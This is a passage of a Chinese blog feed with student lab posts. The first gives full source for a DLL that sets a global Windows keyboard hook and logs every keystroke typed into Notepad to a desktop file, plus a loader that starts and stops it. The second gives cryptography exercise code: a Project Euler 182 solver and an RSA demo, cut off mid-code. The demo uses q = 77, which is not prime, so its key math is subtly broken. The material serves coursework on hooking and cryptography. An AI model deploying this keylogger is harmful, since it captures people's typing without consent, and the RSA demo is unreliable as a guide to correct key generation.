class="title">HkStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HkStop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>( g_hHook ) &#123;</span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p></blockquote><hr><h3 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h3><p>HookDll.cpp(编译出Dll文件的代码)<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义目标进程名为notepad.exe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_PROCESS_NAME <span class="meta-string">"notepad.exe"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义全局变量</span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//DllMain()函数在DLL被加载到进程后会自动执行</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason) &#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="comment">//当DLLMain处理DLL_PROCESS_ATTACH时，DLLMain函数的返回值表示DLL的初始化是否成功。成功返回TRUE，否则返回FALSE。</span></span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="comment">//当DLL处理DLL_PROCESS_DETACH时，DLL应该处理与进程相关的清理操作。</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"><span class="keyword">char</span>* p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>) &#123;<span class="comment">//nCode是一个钩子标识码，钩子过程会利用它决定下一步的进行的操作。这个标识嘛的值与安装的钩子类型相关</span></span><br><span class="line"><span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>)) &#123;<span class="comment">//if(lParam&amp;0x80000000)，键按下，else，键弹起</span></span><br><span class="line"><span class="comment">//键弹起的时候</span></span><br><span class="line">GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);<span class="comment">//获取当前程序运行的绝对路径</span></span><br><span class="line">p = <span class="built_in">strrchr</span>(szPath, <span class="string">'\\'</span>);<span class="comment">//获取在路径中最右边的\\出现的位置</span></span><br><span class="line"><span class="keyword">if</span> (!_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME)) &#123;<span class="comment">//此处比较是否是notepad.exe</span></span><br><span class="line"><span class="keyword">char</span> c =wParam;<span class="comment">//获取消息</span></span><br><span class="line">FILE* fp = fopen(<span class="string">"C:\\Users\\dell\\Desktop\\input.txt"</span>, <span class="string">"a+"</span>);</span><br><span class="line">fwrite(&amp;c, <span class="number">1</span>, <span class="number">1</span>,fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">CallNextHookEx(g_hHook, nCode, wParam, lParam);<span class="comment">//传递给之后的钩子或者应用程序，保证消息不被拦截，实现正常输入</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//比较当前进程名称，若非notepad.exe，则消息传递给应用程序或下一个钩子函数</span></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//__cplusplus是cpp中的自定义宏，定义了这个宏的说明此代码是cpp代码，加入extern "C"&#123;...&#125;会以C语言方式处理其中的代码。因为C++支持重载等高级特性</span></span><br><span class="line"><span class="comment">//如果不以C语言方式编译，容易报错</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">//__declspec，针对编译器的关键字，用于指出导出函数</span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链</span></span><br><span class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line"><span class="comment">//卸载钩子</span></span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>Maincpp，为了读取Dll中的函数，实现让用户决定是否继续钩取<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_DLL_NAME <span class="meta-string">"HookDll.dll"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_HOOKSTART <span class="meta-string">"HookStart"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_HOOKSTOP <span class="meta-string">"HookStop"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hDll=<span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTART HookStart=<span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTOP HookStop=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=<span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//加载KeyHook.dll</span></span><br><span class="line">    hDll=LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取导出函数地址</span></span><br><span class="line">    HookStart=(PFN_HOOKSTART)GetProcAddress(hDll,DEF_HOOKSTART);</span><br><span class="line">    HookStop=(PFN_HOOKSTART)GetProcAddress(hDll,DEF_HOOKSTOP);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//开始钩取</span></span><br><span class="line">    HookStart();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//等待直到用户输入“q”</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"press 'q' to quit!\n"</span>);</span><br><span class="line">    <span class="keyword">while</span>(_getch()!=<span class="string">'q'</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//终止钩取</span></span><br><span class="line">    HookStop();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//卸载KeyHook.dll</span></span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;键盘消息钩取学习&quot;&gt;&lt;a href=&quot;#键盘消息钩取学习&quot; class=&quot;headerlink&quot; title=&quot;键盘消息钩取学习&quot;&gt;&lt;/a&gt;键盘消息钩取学习&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;题目：修改 HookDll.cpp，钩取对 notepad 的输入，使得：&lt;br&gt;a) 输入文本仍能正常显示&lt;br&gt;b) 所有输入文本能够记录到 input.txt 文件中 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="开发相关" scheme="/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="键盘消息钩取学习" scheme="/tags/%E9%94%AE%E7%9B%98%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Windows编程" scheme="/tags/Windows%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>密码学实验</title>
    <link href="/2019/11/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/"/>
    <id>/2019/11/08/密码学实验/</id>
    <published>2019-11-08T11:28:24.000Z</published>
    <updated>2019-11-15T03:26:54.485Z</updated>
    
    <content type="html"><![CDATA[<h2 id="密码学实验"><a href="#密码学实验" class="headerlink" title="密码学实验"></a>密码学实验</h2><p>这是现代密码学配套实验，可以在实验中加深对现代密码学的了解，也可以加强自己的编程能力。</p><a id="more"></a><h3 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h3><blockquote><p>1.RSA加密时，存在某些e和m使得m^e mod n=m。现在在给定的 p=1009，q=3643，找出所有e，满足1&lt;e&lt;φ(1009,3643)且gcd(e,φ)=1，并且此时未加密信息的数目为最小值。求出所有这些e的和。<br>2.自己编写函数根据RSA流程完成字符串加密，并且对字符串进行处理<br>3.对给出的21个Frame，使用不同的RSA攻击方法破解出明文。(2016年密码数学挑战赛的赛题三)</p></blockquote><hr><blockquote><p>第一题，套用计算隐藏消息数的公式[gcd（e -1，p -1）+1] [gcd（e -1，q -1）+1]即可<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf<span class="string">-8</span> -*-</span><br><span class="line">def gcd(a, b):</span><br><span class="line">    while b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    return a</span><br><span class="line">p, q, s, e = 1009, 3643, 0, 3</span><br><span class="line">phi = (p<span class="string">-1</span>) * (q<span class="string">-1</span>)</span><br><span class="line">#[gcd（e <span class="string">-1</span>，p <span class="string">-1</span>）<span class="string">+1</span>] [gcd（e <span class="string">-1</span>，q <span class="string">-1</span>）<span class="string">+1</span>]是公式,phi是偶数，为了让gcd(e, phi)==1成立，所以e必须是奇数，那么e<span class="string">-1</span>必是偶数，q<span class="string">-1</span>和p<span class="string">-1</span>都为偶数，</span><br><span class="line">#让gcd（e <span class="string">-1</span>，p <span class="string">-1</span>）<span class="string">+1</span>最小，即gcd(e<span class="string">-1</span>, q<span class="string">-1</span>)==2即可</span><br><span class="line">while (e &lt; phi):</span><br><span class="line">    if gcd(e, phi)==1 and gcd(e<span class="string">-1</span>, q<span class="string">-1</span>)==2 and gcd(e<span class="string">-1</span>, p<span class="string">-1</span>)==2:</span><br><span class="line">        s += e</span><br><span class="line">    e += 2</span><br><span class="line">print ("Project Euler 182 Solution =", s)</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>第二题，手写一下RSA基本流程即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># python 3.x</span></span><br><span class="line"><span class="comment"># Matasano Problem 39</span></span><br><span class="line"><span class="comment"># Implement RSA</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii  <span class="comment">#binascii模块包含很多在二进制和ASCII编码的二进制表示之间的转换方法</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePrime</span><span class="params">(bits)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> getPrime(bits);  <span class="comment"># 返回一个最大为 N bit的随机素数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mypow</span><span class="params">(a, b, c)</span>:</span> <span class="comment"># returns a^b mod c</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> </span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> (a % c)</span><br><span class="line">    b_bits = bin(b)[<span class="number">2</span>:]</span><br><span class="line">    res = a;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(b_bits)):     </span><br><span class="line">        res = res * res;</span><br><span class="line">        <span class="keyword">if</span> (b_bits[i] == <span class="string">'1'</span> ):</span><br><span class="line">            res = res * a;</span><br><span class="line">        res = res % c;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">rawToHexLUT = [<span class="string">'00'</span>, <span class="string">'01'</span>, <span class="string">'02'</span>, <span class="string">'03'</span>, <span class="string">'04'</span>, <span class="string">'05'</span>, <span class="string">'06'</span>, <span class="string">'07'</span>, <span class="string">'08'</span>, <span class="string">'09'</span>, <span class="string">'0a'</span>, <span class="string">'0b'</span>, <span class="string">'0c'</span>, <span class="string">'0d'</span>, <span class="string">'0e'</span>, <span class="string">'0f'</span>,</span><br><span class="line">               <span class="string">'10'</span>, <span class="string">'11'</span>, <span class="string">'12'</span>, <span class="string">'13'</span>, <span class="string">'14'</span>, <span class="string">'15'</span>, <span class="string">'16'</span>, <span class="string">'17'</span>, <span class="string">'18'</span>, <span class="string">'19'</span>, <span class="string">'1a'</span>, <span class="string">'1b'</span>, <span class="string">'1c'</span>, <span class="string">'1d'</span>, <span class="string">'1e'</span>, <span class="string">'1f'</span>,</span><br><span class="line">               <span class="string">'20'</span>, <span class="string">'21'</span>, <span class="string">'22'</span>, <span class="string">'23'</span>, <span class="string">'24'</span>, <span class="string">'25'</span>, <span class="string">'26'</span>, <span class="string">'27'</span>, <span class="string">'28'</span>, <span class="string">'29'</span>, <span class="string">'2a'</span>, <span class="string">'2b'</span>, <span class="string">'2c'</span>, <span class="string">'2d'</span>, <span class="string">'2e'</span>, <span class="string">'2f'</span>,</span><br><span class="line">               <span class="string">'30'</span>, <span class="string">'31'</span>, <span class="string">'32'</span>, <span class="string">'33'</span>, <span class="string">'34'</span>, <span class="string">'35'</span>, <span class="string">'36'</span>, <span class="string">'37'</span>, <span class="string">'38'</span>, <span class="string">'39'</span>, <span class="string">'3a'</span>, <span class="string">'3b'</span>, <span class="string">'3c'</span>, <span class="string">'3d'</span>, <span class="string">'3e'</span>, <span class="string">'3f'</span>,</span><br><span class="line">               <span class="string">'40'</span>, <span class="string">'41'</span>, <span class="string">'42'</span>, <span class="string">'43'</span>, <span class="string">'44'</span>, <span class="string">'45'</span>, <span class="string">'46'</span>, <span class="string">'47'</span>, <span class="string">'48'</span>, <span class="string">'49'</span>, <span class="string">'4a'</span>, <span class="string">'4b'</span>, <span class="string">'4c'</span>, <span class="string">'4d'</span>, <span class="string">'4e'</span>, <span class="string">'4f'</span>,</span><br><span class="line">               <span class="string">'50'</span>, <span class="string">'51'</span>, <span class="string">'52'</span>, <span class="string">'53'</span>, <span class="string">'54'</span>, <span class="string">'55'</span>, <span class="string">'56'</span>, <span class="string">'57'</span>, <span class="string">'58'</span>, <span class="string">'59'</span>, <span class="string">'5a'</span>, <span class="string">'5b'</span>, <span class="string">'5c'</span>, <span class="string">'5d'</span>, <span class="string">'5e'</span>, <span class="string">'5f'</span>,</span><br><span class="line">               <span class="string">'60'</span>, <span class="string">'61'</span>, <span class="string">'62'</span>, <span class="string">'63'</span>, <span class="string">'64'</span>, <span class="string">'65'</span>, <span class="string">'66'</span>, <span class="string">'67'</span>, <span class="string">'68'</span>, <span class="string">'69'</span>, <span class="string">'6a'</span>, <span class="string">'6b'</span>, <span class="string">'6c'</span>, <span class="string">'6d'</span>, <span class="string">'6e'</span>, <span class="string">'6f'</span>,</span><br><span class="line">               <span class="string">'70'</span>, <span class="string">'71'</span>, <span class="string">'72'</span>, <span class="string">'73'</span>, <span class="string">'74'</span>, <span class="string">'75'</span>, <span class="string">'76'</span>, <span class="string">'77'</span>, <span class="string">'78'</span>, <span class="string">'79'</span>, <span class="string">'7a'</span>, <span class="string">'7b'</span>, <span class="string">'7c'</span>, <span class="string">'7d'</span>, <span class="string">'7e'</span>, <span class="string">'7f'</span>,</span><br><span class="line">               <span class="string">'80'</span>, <span class="string">'81'</span>, <span class="string">'82'</span>, <span class="string">'83'</span>, <span class="string">'84'</span>, <span class="string">'85'</span>, <span class="string">'86'</span>, <span class="string">'87'</span>, <span class="string">'88'</span>, <span class="string">'89'</span>, <span class="string">'8a'</span>, <span class="string">'8b'</span>, <span class="string">'8c'</span>, <span class="string">'8d'</span>, <span class="string">'8e'</span>, <span class="string">'8f'</span>,</span><br><span class="line">               <span class="string">'90'</span>, <span class="string">'91'</span>, <span class="string">'92'</span>, <span class="string">'93'</span>, <span class="string">'94'</span>, <span class="string">'95'</span>, <span class="string">'96'</span>, <span class="string">'97'</span>, <span class="string">'98'</span>, <span class="string">'99'</span>, <span class="string">'9a'</span>, <span class="string">'9b'</span>, <span class="string">'9c'</span>, <span class="string">'9d'</span>, <span class="string">'9e'</span>, <span class="string">'9f'</span>,</span><br><span class="line">               <span class="string">'a0'</span>, <span class="string">'a1'</span>, <span class="string">'a2'</span>, <span class="string">'a3'</span>, <span class="string">'a4'</span>, <span class="string">'a5'</span>, <span class="string">'a6'</span>, <span class="string">'a7'</span>, <span class="string">'a8'</span>, <span class="string">'a9'</span>, <span class="string">'aa'</span>, <span class="string">'ab'</span>, <span class="string">'ac'</span>, <span class="string">'ad'</span>, <span class="string">'ae'</span>, <span class="string">'af'</span>,</span><br><span class="line">               <span class="string">'b0'</span>, <span class="string">'b1'</span>, <span class="string">'b2'</span>, <span class="string">'b3'</span>, <span class="string">'b4'</span>, <span class="string">'b5'</span>, <span class="string">'b6'</span>, <span class="string">'b7'</span>, <span class="string">'b8'</span>, <span class="string">'b9'</span>, <span class="string">'ba'</span>, <span class="string">'bb'</span>, <span class="string">'bc'</span>, <span class="string">'bd'</span>, <span class="string">'be'</span>, <span class="string">'bf'</span>,</span><br><span class="line">               <span class="string">'c0'</span>, <span class="string">'c1'</span>, <span class="string">'c2'</span>, <span class="string">'c3'</span>, <span class="string">'c4'</span>, <span class="string">'c5'</span>, <span class="string">'c6'</span>, <span class="string">'c7'</span>, <span class="string">'c8'</span>, <span class="string">'c9'</span>, <span class="string">'ca'</span>, <span class="string">'cb'</span>, <span class="string">'cc'</span>, <span class="string">'cd'</span>, <span class="string">'ce'</span>, <span class="string">'cf'</span>,</span><br><span class="line">               <span class="string">'d0'</span>, <span class="string">'d1'</span>, <span class="string">'d2'</span>, <span class="string">'d3'</span>, <span class="string">'d4'</span>, <span class="string">'d5'</span>, <span class="string">'d6'</span>, <span class="string">'d7'</span>, <span class="string">'d8'</span>, <span class="string">'d9'</span>, <span class="string">'da'</span>, <span class="string">'db'</span>, <span class="string">'dc'</span>, <span class="string">'dd'</span>, <span class="string">'de'</span>, <span class="string">'df'</span>,</span><br><span class="line">               <span class="string">'e0'</span>, <span class="string">'e1'</span>, <span class="string">'e2'</span>, <span class="string">'e3'</span>, <span class="string">'e4'</span>, <span class="string">'e5'</span>, <span class="string">'e6'</span>, <span class="string">'e7'</span>, <span class="string">'e8'</span>, <span class="string">'e9'</span>, <span class="string">'ea'</span>, <span class="string">'eb'</span>, <span class="string">'ec'</span>, <span class="string">'ed'</span>, <span class="string">'ee'</span>, <span class="string">'ef'</span>,</span><br><span class="line">               <span class="string">'f0'</span>, <span class="string">'f1'</span>, <span class="string">'f2'</span>, <span class="string">'f3'</span>, <span class="string">'f4'</span>, <span class="string">'f5'</span>, <span class="string">'f6'</span>, <span class="string">'f7'</span>, <span class="string">'f8'</span>, <span class="string">'f9'</span>, <span class="string">'fa'</span>, <span class="string">'fb'</span>, <span class="string">'fc'</span>, <span class="string">'fd'</span>, <span class="string">'fe'</span>, <span class="string">'ff'</span>,]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexToRaw</span><span class="params">(hx)</span>:</span>   <span class="comment">#十六进制字符串转换为raw</span></span><br><span class="line">    raw = binascii.unhexlify(hx);</span><br><span class="line">    <span class="keyword">return</span> raw;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rawToHex</span><span class="params">(raw)</span>:</span>  <span class="comment">#raw串转换为十六进制      raw原始字符串</span></span><br><span class="line">    <span class="comment">#hx = binascii.hexlify(raw);</span></span><br><span class="line">    hx = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> raw:</span><br><span class="line">        <span class="keyword">if</span> type(r) != int:</span><br><span class="line">            r = ord(r);</span><br><span class="line">        hx += rawToHexLUT[r];</span><br><span class="line">    <span class="keyword">return</span> bytes(hx, <span class="string">'UTF-8'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#扩展欧几里得算法</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        q = a // b;</span><br><span class="line">        r = a % b;</span><br><span class="line">        (s, t) = egcd(b, r)</span><br><span class="line">        <span class="keyword">return</span> (t, s - q * t)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invmod</span><span class="params">(a, N)</span>:</span>   <span class="comment"># Returns a^-1 mod N 乘法逆运算</span></span><br><span class="line">    (x, y) = egcd(a, N);</span><br><span class="line">    <span class="keyword">return</span> x % N;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_demo1</span><span class="params">()</span>:</span></span><br><span class="line">    p = <span class="number">71</span>;</span><br><span class="line">    q = <span class="number">77</span>;</span><br><span class="line">    N = p*q;</span><br><span class="line">    et = (p<span class="number">-1</span>)*(q<span class="number">-1</span>);</span><br><span class="line">    e = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">assert</span>((et%e) != <span class="number">0</span>); </span><br><span class="line">    d = invmod(e,et)</span><br><span class="line">    message = <span class="number">42</span>;</span><br><span class="line">    encrypted = mypow(message, e, N);</span><br><span class="line">    decrypted = mypow(encrypted, d, N);</span><br><span class="line">    <span class="keyword">assert</span>(message == decrypted)</span><br><span class="line"><span class="function"><span 